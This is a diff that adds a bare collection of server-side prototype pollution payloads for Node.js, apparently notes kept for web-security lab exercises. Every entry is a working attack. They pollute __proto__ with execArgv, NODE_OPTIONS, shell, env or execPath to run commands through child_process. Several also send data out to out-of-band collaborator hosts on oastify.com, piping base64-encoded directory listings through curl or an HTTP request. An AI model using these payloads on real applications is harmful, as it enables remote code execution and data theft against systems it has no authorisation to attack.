@@ -1,0 +1,51 @@
+"__proto__": {
+    "argv0":"node",
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=id.oastify.com"
+}
+
+"__proto__": {
+    "execArgv": [
+        "--eval=require('child_process').execSync('id')",
+        //"--eval=require('child_process').spawn('id')",
+        //"--eval=require('child_process').fork('id')",
+        //"--eval=require('http').get('http://COLLABORATOR/')",
+        //"--inspect=COLLABORATOR-ID.oastify.com",
+        //"--eval=require('http').get('http://YOUR-ID.oastify.com/?x=' + encodeURIComponent(require('child_process').execSync('id').toString()))",
+    ]
+}
+
+"__proto__": {
+    "shell": "vim",
+    "input": "!ls /home/carlos | base64 | curl -d @- http://COLLABORATOR\n"
+}
+
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
+    //"NODE_OPTIONS": "--eval=require('child_process').execSync('id')"
+}
+
+"__proto__": {
+    "env": { 
+        "EVIL": "console.log(require('child_process').execSync('id').toString())//"
+    },
+    "NODE_OPTIONS": "--require /proc/self/environ"
+}
+
+"__proto__": {
+    "argv0": "console.log(require('child_process').execSync('id').toString())//",
+    "NODE_OPTIONS": "--require /proc/self/cmdline"
+}
+
+"__proto__": {
+    "execPath": "/bin/sh",
+    "argv0": "/bin/sh",
+    "execArgv": ["-c", "id"]
+}
+
+"__proto__": {
+    "execArgv": [
+        "--eval=require('http').get('http://YOUR-ID.oastify.com/?x=' + require('child_process').execSync('ls node_apps/ | base64 -w0').toString().trim())"
+    ]
+}
